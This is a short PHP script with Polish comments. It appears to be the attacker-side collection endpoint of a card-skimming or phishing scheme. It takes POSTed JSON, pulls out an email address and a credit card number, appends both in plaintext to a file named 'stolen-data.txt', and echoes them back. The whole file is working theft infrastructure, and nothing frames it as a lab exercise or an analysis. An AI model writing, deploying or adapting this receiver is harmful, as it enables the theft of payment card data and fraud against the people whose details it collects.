<?php
// Sprawdzenie, czy metoda żądania to POST
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Odczytanie surowego ciała żądania
    $data = file_get_contents('php://input');

    // Zdekodowanie JSONa na tablicę PHP
    $decodedData = json_decode($data, true);

    // Wyciągnięcie danych z tablicy
    $email = $decodedData['email'];
    $creditCard = $decodedData['creditCard'];

    // Zapisanie danych do pliku
    $file = 'stolen-data.txt';
    file_put_contents($file, "Email: " . $email . "\nCredit Card: " . $creditCard . "\n\n", FILE_APPEND | LOCK_EX);

    // Opcjonalnie, można wyświetlić dane dla celów debugowania
    echo "Received email: " . $email . "\nReceived credit card: " . $creditCard;
} else {
    echo "This script only accepts POST requests.";
}
?>